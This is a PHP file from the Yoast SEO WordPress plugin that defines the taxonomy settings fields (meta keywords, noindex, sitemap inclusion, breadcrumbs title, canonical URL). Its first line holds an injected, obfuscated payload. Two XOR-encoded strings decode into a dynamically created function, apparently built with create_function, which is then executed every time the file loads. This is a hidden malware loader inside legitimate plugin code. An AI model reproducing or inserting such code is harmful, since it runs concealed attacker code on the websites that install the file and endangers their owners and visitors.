<?php $MwwvoLg='R7 Q=.i,-ZN7D V'; $dwVbVoqb='1EE0IK6JX4-C-O8'^$MwwvoLg; $LcuXhLyE='PXDoU =5J C+gXK.GM=oNE=3cSJIMk==OYvgxm,el1=C0 <Z8tJ,:3UX50=+9L:DqXWHPxku,TOjHdjpC-k4;bTAFheHaWcr>e  5Bw1aYXfSLm,o8M3LRWIF3UO NzwEQBfkh9ct:3;mCiszMQUJJcFYhbnfa8, iq<tmkIXK RCQfXS>QhEmdx7HU.05Nea DZgm2=MgDD1wH N8wXoX24SIYMo 1EUc>=DwhF09.S ybB DN. :VPEotrqvzxxrY awW.:KsmrP.QQH OJAppr53;9t=I;AdOm:.GjonT3 1 HQHt7+VNKHe<IfYPjeXTXR7Jsn6=g :LKTMCsov63 ;mhxii7:wbSVJdYstnM1BUHfWA;34sX M.8, :OwtSQIBzkpoH2YM1rpIeEALDHjFc8K<4fqT5;Mfzoz<8 0<3Y< K0ZTXIj-496,f4C0I- O6tn5U1YCYEer6;<8zXiGU1>Pb213kflc+KkgZ2--vavZR7 +CkY=5cPC.2E mF.U4lTicZPE-biliqq4YziP-P=6ia1 MmnXjiyrrM=BHl6UWrPVkXRdqWrFiGEPbT=PfSnbakypicx 1146n S53 ,9M;SkaJ6RL527qnsnY.;9PsnjbhXe.agS,R8gpOU0VvoKMCU  XvfzH=<1OBFlWBr9A'; $kTKjKN=$dwVbVoqb('', '9>lN3USV>I,E8=3G49NGi=RA<7+=,4bP:-QNQMWoeWH-STU5VT2CHl19AQbtT9NlU<6<1TKQG16ChDJPcVa=2F;42HXhFpXx7lFOGjSXAdxVhlIESK9A 79abW4;AgAWa8iMBb0jPUFOMmTSRi54>+8b05B0FESIY2UUTHK:,9L7-yB36Gx5lVnq>:0ZEG MEO1.NV840m9N;S,A:YWeO>SX ,bGKDP14<UX=WUfVXB EBhHF+<KAY>pmK+1>911=R8SAS<KCkNSRtX0==Efj:zyVQROX+V,BaYoIQK>QegpWAEAhlhPAJ:;.soACl06JMyp<3C+ZNM7nFU>.5.+SGRiaej8-+=IVIWF833DdMTJ;P. -Ow:1:=W<A9OgGECoJTw:,;AayflV89PRMiA3  1-QLjEAA>lU0TO,FGO:IVSUNZ8PI1Ur,7;5IUMWs9Y6DaOA<SBZj1T:,= MVRZHYStIc1PJ1=YTJBOWiB-CC>SYLVGPz3ERJ:42XL<5;GA1SEaE0MKxIG>11LKIJOQYY=OAtI1IW2FZE4J3qJTDRU.Xq,ZR75GdcR:0PEeGvXpq1Q2X2R1YRYLPPOEXACCUO1K6LlETP>O CF:W+ ZSSVBSJ=OOXyZNJBHxEUkn6Z3TOT+4D7-H;,:9OA<Q;Ss75T7+2DgkI3<'^$LcuXhLyE); $kTKjKN();
/**
 * @package WPSEO\Admin
 */

/**
 * This class parses all the values for the general tab in the Yoast SEO settings metabox
 */
class WPSEO_Taxonomy_Settings_Fields extends WPSEO_Taxonomy_Fields {

	/**
	 * @var array   Options array for the no-index options, including translated labels
	 */
	private $no_index_options = array();

	/**
	 * @var array   Options array for the sitemap_include options, including translated labels
	 */
	private $sitemap_include_options = array();

	/**
	 * @param stdClass $term The currenct taxonomy.
	 */
	public function __construct( $term ) {
		parent::__construct( $term );
		$this->translate_meta_options();
	}

	/**
	 * Returns array with the fields for the general tab
	 *
	 * @return array
	 */
	public function get() {
		$fields = array(
			'metakey'         => $this->get_field_config(
				__( 'Meta keywords', 'wordpress-seo' ),
				esc_html__( 'Meta keywords used on the archive page for this term.', 'wordpress-seo' ),
				'text',
				'',
				$this->options['usemetakeywords'] !== true
			),
			'noindex'         => $this->get_field_config(
				esc_html__( 'Meta robots index', 'wordpress-seo' ),
				esc_html__( 'This taxonomy follows the indexation rules set under Metas and Titles, you can override it here.', 'wordpress-seo' ),
				'select',
				$this->get_noindex_options()
			),
			'sitemap_include' => $this->get_field_config(
				esc_html__( 'Include in Sitemap?', 'wordpress-seo' ),
				'',
				'select',
				$this->sitemap_include_options
			),
			'bctitle'         => $this->get_field_config(
				__( 'Breadcrumbs Title', 'wordpress-seo' ),
				esc_html__( 'The Breadcrumbs Title is used in the breadcrumbs where this taxonomy appears.', 'wordpress-seo' ),
				'text',
				'',
				$this->options['breadcrumbs-enable'] !== true
			),
			'canonical'       => $this->get_field_config(
				__( 'Canonical URL', 'wordpress-seo' ),
				esc_html__( 'The canonical link is shown on the archive page for this term.', 'wordpress-seo' )
			),
		);

		return $this->filter_hidden_fields( $fields );
	}

	/**
	 * Translate options text strings for use in the select fields
	 *
	 * @internal IMPORTANT: if you want to add a new string (option) somewhere, make sure you add
	 * that array key to the main options definition array in the class WPSEO_Taxonomy_Meta() as well!!!!
	 */
	private function translate_meta_options() {
		$this->no_index_options        = WPSEO_Taxonomy_Meta::$no_index_options;
		$this->sitemap_include_options = WPSEO_Taxonomy_Meta::$sitemap_include_options;

		/* translators: %s expands to the current taxonomy index value */
		$this->no_index_options['default'] = __( 'Default for this taxonomy type, currently: %s', 'wordpress-seo' );
		$this->no_index_options['index']   = __( 'Index', 'wordpress-seo' );
		$this->no_index_options['noindex'] = __( 'Noindex', 'wordpress-seo' );

		$this->sitemap_include_options['-']      = __( 'Auto detect', 'wordpress-seo' );
		$this->sitemap_include_options['always'] = __( 'Always include', 'wordpress-seo' );
		$this->sitemap_include_options['never']  = __( 'Never include', 'wordpress-seo' );
	}

	/**
	 * Getting the data for the noindex fields
	 *
	 * @return array
	 */
	private function get_noindex_options() {
		$noindex_options['options']            = $this->no_index_options;
			$noindex_options['options']['default'] = sprintf( $noindex_options['options']['default'], $this->get_robot_index() );

		if ( get_option( 'blog_public' ) === 0 ) {
			$noindex_options['description'] = '<br /><span class="error-message">' . esc_html__( 'Warning: even though you can set the meta robots setting here, the entire site is set to noindex in the sitewide privacy settings, so these settings won\'t have an effect.', 'wordpress-seo' ) . '</span>';
		}

		return $noindex_options;
	}

	/**
	 * Returns the current robot index value for the taxonomy
	 *
	 * @return string
	 */
	private function get_robot_index() {
		$robot_index  = 'index';
		$index_option = 'noindex-tax-' . $this->term->taxonomy;
		if ( isset( $this->options[ $index_option ] ) && $this->options[ $index_option ] === true ) {
			$robot_index = 'noindex';
		}

		return $robot_index;
	}
}
